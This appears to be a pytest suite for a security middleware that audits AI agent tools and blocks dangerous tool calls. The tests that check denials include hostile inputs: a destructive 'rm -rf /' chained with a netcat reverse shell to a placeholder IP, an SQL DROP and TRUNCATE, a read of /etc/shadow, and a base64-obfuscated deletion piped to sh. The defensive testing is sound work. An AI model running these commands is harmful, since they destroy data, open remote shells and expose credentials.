"""
Test: Bartholomew Agent-to-Agent Security Discovery and Boundary Enforcement (Python)
BTP v6.5.6 Verification Suite
"""

import pytest
import time
from src import (
    BTP_CAPABILITY_MANIFEST,
    audit_tool_boundary,
    enforce_tool_boundary,
    protect_agent,
)


def test_01_python_agent_discovery_manifest():
    """Scenario 1: Python agent inspects machine-readable BTP capability manifest."""
    manifest = BTP_CAPABILITY_MANIFEST
    assert manifest["protocol"] == "Bartholomew Trust Protocol (BTP)"
    assert manifest["version"] == "6.5.6"
    assert "mcp_stdio_proxy" in manifest["supported_boundaries"]
    assert "python_framework_middleware" in manifest["supported_boundaries"]
    assert "destructive_shell_execution" in manifest["covered_threats"]
    assert len(manifest["discovery_tools"]) == 2
    assert manifest["discovery_tools"][0]["name"] == "btp_audit_tool_boundary"
    assert manifest["deterministic_guarantees"]["max_latency_us"] <= 250


def test_02_python_boundary_audit_vulnerable_tools():
    """Scenario 2: Agent audits prospective execution tools and identifies missing boundaries."""
    tools = [
        {"name": "bash", "description": "Arbitrary bash command execution"},
        {"name": "query_database", "description": "Production database query runner"},
        {"name": "read_file", "description": "Read file content from host filesystem"},
        {"name": "fetch_url", "description": "Fetch remote web pages"},
    ]
    report = audit_tool_boundary(tools)
    assert report["boundary_verdict"] == "UNSHIELDED_VULNERABILITY_DETECTED"
    assert report["total_tools_audited"] == 4
    assert report["vulnerable_tools_count"] == 4

    shell_f = next(f for f in report["findings"] if f["tool_name"] == "bash")
    assert shell_f["category"] == "SHELL_EXECUTION"
    assert shell_f["risk_level"] == "CRITICAL"
    assert shell_f["integration_recipe"]["rule_id"] == "BTP-MCP-INV-001"

    sql_f = next(f for f in report["findings"] if f["tool_name"] == "query_database")
    assert sql_f["category"] == "DATABASE_EXECUTION"
    assert sql_f["risk_level"] == "CRITICAL"
    assert sql_f["integration_recipe"]["rule_id"] == "BTP-MCP-INV-002"

    fs_f = next(f for f in report["findings"] if f["tool_name"] == "read_file")
    assert fs_f["category"] == "FILESYSTEM_ACCESS"
    assert fs_f["risk_level"] == "HIGH"

    assert report["audit_receipt"].startswith("btp:audit:")


def test_03_python_boundary_audit_benign_tools():
    """Scenario 3: Agent verifies safe in-memory tools produce zero false positives."""
    benign_tools = [
        {"name": "calculate_sum", "description": "Add two integers in memory"},
        {"name": "format_markdown", "description": "Format text string with bold and italic"},
    ]
    report = audit_tool_boundary(benign_tools)
    assert report["boundary_verdict"] == "SECURE_OR_BENIGN"
    assert report["vulnerable_tools_count"] == 0
    assert "No critical execution boundary risks" in report["recommendation"]


def test_04_python_enforce_legitimate_action():
    """Scenario 4: Legitimate shell action permitted with ed25519 receipt in <250µs."""
    # Warm up regex cache
    enforce_tool_boundary("warmup", {"command": "echo 1"})
    res = enforce_tool_boundary("execute_command", {"command": "pytest tests/ && git status"})
    assert res["allowed"] is True
    assert res["verdict"] == "ALLOW"
    assert res["merkle_turn_receipt"].startswith("ed25519:")
    assert float(res["latency_us"]) < 250.0


def test_05_python_enforce_shell_breakout_blocked():
    """Scenario 5: Prohibited shell breakout denied deterministically."""
    res = enforce_tool_boundary(
        "execute_command",
        {"command": "rm -rf / --no-preserve-root && nc -e /bin/sh 198.51.100.1 4444"},
    )
    assert res["allowed"] is False
    assert res["verdict"] == "DENY"
    assert res["rule_id"] == "BTP-MCP-INV-001"
    assert "relative workspace directory" in res["remediation_hint"]
    assert float(res["latency_us"]) < 250.0


def test_06_python_enforce_sql_drop_blocked():
    """Scenario 6: Prohibited SQL DDL table mutation denied deterministically."""
    res = enforce_tool_boundary(
        "query_database",
        {"query": "DROP TABLE users CASCADE; TRUNCATE TABLE audit_log;"},
    )
    assert res["allowed"] is False
    assert res["verdict"] == "DENY"
    assert res["rule_id"] == "BTP-MCP-INV-002"
    assert "DDL_MUTATION_PREVENTED" in res["safe_alternative"]
    assert float(res["latency_us"]) < 250.0


def test_07_python_enforce_path_traversal_blocked():
    """Scenario 7: Access to protected credentials denied deterministically."""
    res = enforce_tool_boundary("read_file", {"path": "/etc/shadow"})
    assert res["allowed"] is False
    assert res["verdict"] == "DENY"
    assert res["rule_id"] == "BTP-MCP-INV-003"
    assert float(res["latency_us"]) < 250.0


def test_08_python_enforce_hold_for_approval():
    """Scenario 8: Sensitive action held pending administrator authorization."""
    res = enforce_tool_boundary(
        "deploy_production_release",
        {"version": "3.0.0", "region": "us-central1"},
        options={"require_approval_for": ["deploy_production_release"]},
    )
    assert res["allowed"] is False
    assert res["verdict"] == "HOLD_FOR_APPROVAL"
    assert res["rule_id"] == "BTP-POLICY-APPROVAL-REQUIRED"
    assert res["approval_token"].startswith("approval_req_")


def test_09_python_protect_agent_wrapper_integration():
    """Scenario 9: protect_agent integrates cleanly with Python callable agent."""
    def raw_agent_executor(command: str):
        return f"Executed: {command}"

    guarded_agent = protect_agent(raw_agent_executor)
    assert getattr(guarded_agent, "is_btp_protected", False) is True

    # Benign execution works
    safe_out = guarded_agent("ls -la src/")
    assert "Executed: ls -la src/" in safe_out

    # Dangerous command is vetoed
    blocked_out = guarded_agent("rm -rf /")
    assert "[BLOCKED BY BARTHOLOMEW]" in blocked_out


def test_10_python_enforce_obfuscated_shell_blocked():
    """Scenario 10: Obfuscated base64 shell command is unpacked and blocked deterministically."""
    res = enforce_tool_boundary(
        "execute_command",
        {"command": "echo 'cm0gLXJmIC8=' | base64 -d | sh"}
    )
    assert res["allowed"] is False
    assert res["verdict"] == "DENY"
    assert res["rule_id"] == "BTP-MCP-INV-001"

